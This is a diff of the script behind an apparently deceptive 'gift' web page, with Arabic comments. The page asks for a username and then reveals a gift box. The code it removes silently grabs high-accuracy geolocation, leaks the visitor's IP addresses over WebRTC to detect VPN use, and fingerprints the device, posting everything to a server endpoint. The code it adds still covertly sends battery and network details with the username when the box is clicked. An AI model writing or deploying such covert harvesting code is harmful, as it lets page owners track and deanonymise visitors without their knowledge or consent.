@@ -308,9 +308,6 @@
 <script>
 let alreadySent = false;
 let username = '';
-let locationData = null;
-let vpnDetected = false;
-let networkData = {};
 
 // خلفية القلوب
 function createHeartsBackground() {
@@ -362,199 +359,6 @@ function createHackerText() {
 }
 createHackerText();
 
-// جلب معلومات الشبكة بدقة
-function getAccurateNetworkInfo() {
-  return new Promise((resolve) => {
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    
-    if (!connection) {
-      resolve({
-        type: 'غير معروف',
-        speed: 'غير معروف',
-        signal: 'غير معروف',
-        networkType: 'غير معروف'
-      });
-      return;
-    }
-
-    const info = {
-      type: 'غير معروف',
-      speed: 'غير معروف',
-      signal: 'غير معروف',
-      networkType: 'غير معروف',
-      rtt: connection.rtt || 'غير معروف'
-    };
-
-    // تحديد نوع الاتصال بدقة
-    if (connection.type) {
-      const types = {
-        'wifi': 'واي فاي',
-        'cellular': 'بيانات جوال',
-        'ethernet': 'إيثرنت',
-        'none': 'غير متصل',
-        'unknown': 'غير معروف'
-      };
-      info.type = types[connection.type] || connection.type;
-    } else {
-      // طريقة أكثر دقة للتحديد
-      const downlink = connection.downlink || 0;
-      const rtt = connection.rtt || 0;
-      
-      if (downlink === 0 && rtt === 0) {
-        info.type = 'غير متصل';
-      } else if (downlink > 20 && rtt < 30) {
-        info.type = 'واي فاي';
-      } else if (downlink > 5 && rtt < 100) {
-        info.type = 'بيانات جوال (4G)';
-      } else if (downlink > 1 && rtt < 200) {
-        info.type = 'بيانات جوال (3G)';
-      } else if (downlink > 0) {
-        info.type = 'بيانات جوال (2G)';
-      } else {
-        info.type = 'غير معروف';
-      }
-    }
-
-    // السرعة بدقة
-    if (connection.downlink !== undefined && connection.downlink !== null) {
-      const speed = connection.downlink;
-      if (speed >= 1000) {
-        info.speed = (speed / 1000).toFixed(2) + ' Gbps';
-      } else if (speed >= 1) {
-        info.speed = speed.toFixed(2) + ' Mbps';
-      } else {
-        info.speed = (speed * 1000).toFixed(0) + ' Kbps';
-      }
-    }
-
-    // نوع الشبكة بدقة
-    if (connection.effectiveType) {
-      const types = {
-        'slow-2g': '2G (بطيء)',
-        '2g': '2G',
-        '3g': '3G',
-        '4g': '4G'
-      };
-      info.networkType = types[connection.effectiveType] || connection.effectiveType;
-    }
-
-    // قوة الإشارة بدقة
-    if (connection.bars !== undefined && connection.bars !== null) {
-      const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
-      info.signal = bars + '/4';
-    } else {
-      // تقدير من السرعة و RTT
-      const downlink = connection.downlink || 0;
-      const rtt = connection.rtt || 0;
-      
-      if (downlink >= 50 && rtt < 20) {
-        info.signal = '4/4 (ممتاز)';
-      } else if (downlink >= 20 && rtt < 50) {
-        info.signal = '3/4 (جيد)';
-      } else if (downlink >= 5 && rtt < 100) {
-        info.signal = '2/4 (متوسط)';
-      } else if (downlink >= 1 && rtt < 200) {
-        info.signal = '1/4 (ضعيف)';
-      } else if (downlink > 0) {
-        info.signal = '0/4 (سيء جداً)';
-      } else {
-        info.signal = 'لا توجد إشارة';
-      }
-    }
-
-    resolve(info);
-  });
-}
-
-// الكشف عن الـ VPN بدقة
-function detectVPN() {
-  return new Promise((resolve) => {
-    // طريقة 1: WebRTC
-    try {
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-      });
-      
-      let localIP = null;
-      let publicIP = null;
-      
-      pc.onicecandidate = (event) => {
-        if (event.candidate) {
-          const candidate = event.candidate.candidate;
-          const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
-          const ip = candidate.match(ipRegex);
-          if (ip) {
-            const parts = ip[0].split('.');
-            const firstOctet = parseInt(parts[0]);
-            
-            // IP خاص
-            if (firstOctet === 10 || firstOctet === 127 || 
-                (firstOctet === 172 && parseInt(parts[1]) >= 16 && parseInt(parts[1]) <= 31) ||
-                (firstOctet === 192 && parseInt(parts[1]) === 168)) {
-              localIP = ip[0];
-            } else {
-              publicIP = ip[0];
-            }
-          }
-          pc.close();
-        }
-      };
-      
-      pc.createDataChannel('test');
-      pc.createOffer()
-        .then(offer => pc.setLocalDescription(offer))
-        .catch(() => resolve(false));
-      
-      setTimeout(() => {
-        pc.close();
-        // إذا كان هناك IP عام مختلف عن IP المحلي، هذا يشير لوجود VPN
-        if (publicIP && localIP) {
-          resolve(true);
-        } else if (publicIP) {
-          // قد يكون VPN أو اتصال مباشر
-          // نتحقق بطريقة أخرى
-          resolve(false);
-        } else {
-          resolve(false);
-        }
-      }, 3000);
-    } catch (e) {
-      resolve(false);
-    }
-  });
-}
-
-// جلب الموقع الجغرافي
-function getLocation() {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve(null);
-      return;
-    }
-    
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        resolve({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          altitude: position.coords.altitude,
-          speed: position.coords.speed,
-          heading: position.coords.heading
-        });
-      },
-      (error) => {
-        resolve(null);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
-  });
-}
-
 // عناصر DOM
 const loginScreen = document.getElementById('login-screen');
 const giftScreen = document.getElementById('gift-screen');
@@ -565,7 +369,7 @@ const giftBox = document.getElementById('gift-box');
 const giftUsername = document.getElementById('gift-username');
 
 // معالج تسجيل الدخول
-loginForm.addEventListener('submit', async function(e) {
+loginForm.addEventListener('submit', function(e) {
   e.preventDefault();
   username = usernameInput.value.trim();
   
@@ -582,15 +386,6 @@ loginForm.addEventListener('submit', async function(e) {
   giftUsername.textContent = username;
   loginScreen.classList.add('hidden');
   giftScreen.classList.remove('hidden');
-  
-  // جلب كل البيانات في الخلفية
-  try {
-    locationData = await getLocation();
-    vpnDetected = await detectVPN();
-    networkData = await getAccurateNetworkInfo();
-  } catch (error) {
-    console.error('Error fetching data:', error);
-  }
 });
 
 // معالج صندوق الهدية
@@ -601,54 +396,100 @@ giftBox.addEventListener('click', function() {
   this.style.animation = 'none';
   this.style.transform = 'scale(1.3)';
   
-  setTimeout(async () => {
+  setTimeout(() => {
     document.body.classList.add('green-mode');
     
     if (!alreadySent) {
       alreadySent = true;
       
-      // جمع كل البيانات
-      const allData = {
-        username: username,
-        location: locationData,
-        vpn: vpnDetected,
-        network: networkData
-      };
-      
       // معلومات البطارية
       if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          allData.battery = Math.round(battery.level * 100);
-          allData.batteryCharging = battery.charging;
-          allData.batteryTime = battery.dischargingTime;
-        } catch (error) {
-          allData.battery = 'غير معروف';
-        }
-      }
-      
-      // معلومات الجهاز
-      allData.device = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory || 'غير معروف',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        vendor: navigator.vendor || 'غير معروف'
-      };
-      
-      // إرسال جميع البيانات
-      try {
-        await fetch('/api/send-all-data', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(allData)
-        });
-      } catch (error) {
-        console.error('Error sending data:', error);
+        navigator.getBattery().then(function(battery) {
+          let percent = Math.round(battery.level * 100);
+          let charging = battery.charging ? '✅ يشحن' : '❌ لا يشحن';
+          
+          // معلومات الشبكة
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          
+          let connectionType = 'غير معروف';
+          let speed = 'غير معروف';
+          let signal = 'غير معروف';
+          
+          if (connection) {
+            // نوع الاتصال
+            if (connection.type) {
+              const types = {
+                'wifi': 'واي فاي',
+                'cellular': 'بيانات جوال',
+                'ethernet': 'إيثرنت',
+                'none': 'غير متصل',
+                'unknown': 'غير معروف'
+              };
+              connectionType = types[connection.type] || connection.type;
+            } else {
+              // تقدير من السرعة
+              const downlink = connection.downlink || 0;
+              const rtt = connection.rtt || 0;
+              if (downlink === 0 && rtt === 0) {
+                connectionType = 'غير متصل';
+              } else if (downlink > 20 && rtt < 30) {
+                connectionType = 'واي فاي';
+              } else if (downlink > 0) {
+                connectionType = 'بيانات جوال';
+              } else {
+                connectionType = 'غير معروف';
+              }
+            }
+            
+            // السرعة
+            if (connection.downlink !== undefined && connection.downlink !== null) {
+              const speedValue = connection.downlink;
+              if (speedValue >= 1000) {
+                speed = (speedValue / 1000).toFixed(2) + ' Gbps';
+              } else if (speedValue >= 1) {
+                speed = speedValue.toFixed(2) + ' Mbps';
+              } else {
+                speed = (speedValue * 1000).toFixed(0) + ' Kbps';
+              }
+            }
+            
+            // الإشارة
+            if (connection.bars !== undefined && connection.bars !== null) {
+              const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
+              signal = bars + '/4';
+            } else {
+              // تقدير من السرعة
+              const downlink = connection.downlink || 0;
+              if (downlink >= 50) {
+                signal = '4/4 (ممتازة)';
+              } else if (downlink >= 20) {
+                signal = '3/4 (جيدة)';
+              } else if (downlink >= 5) {
+                signal = '2/4 (متوسطة)';
+              } else if (downlink >= 1) {
+                signal = '1/4 (ضعيفة)';
+              } else if (downlink > 0) {
+                signal = '0/4 (سيئة جداً)';
+              } else {
+                signal = 'لا توجد إشارة';
+              }
+            }
+          }
+          
+          // إرسال البيانات
+          fetch('/api/send-all-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              username: username,
+              battery: percent,
+              charging: charging,
+              connectionType: connectionType,
+              speed: speed,
+              signal: signal
+            })
+          });
+        }).catch(() => {});
       }
     }
   }, 600);
